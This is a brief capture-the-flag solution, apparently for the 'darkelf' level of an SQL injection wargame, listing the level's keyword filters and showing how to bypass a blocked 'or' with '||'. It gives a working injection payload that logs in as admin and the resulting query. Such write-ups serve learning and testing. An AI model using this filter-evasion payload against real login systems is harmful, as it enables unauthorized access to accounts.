Filter1(pw): `prob` | `_` | `.` | `()` | `'` | `"` | ``` ` ```

Filter2(pw): `or` | `and`

Bypass **or** with **||** (both all mean logical or. [Reference here](https://dev.mysql.com/doc/refman/8.0/en/built-in-function-reference.html) )

PW: `123' || id='admin' -- ;`

Payload: `?pw=123' || id='admin' -- ;`

Query: `select id from prob_darkelf where id='guest' and pw='123' || id='admin' -- ;'`


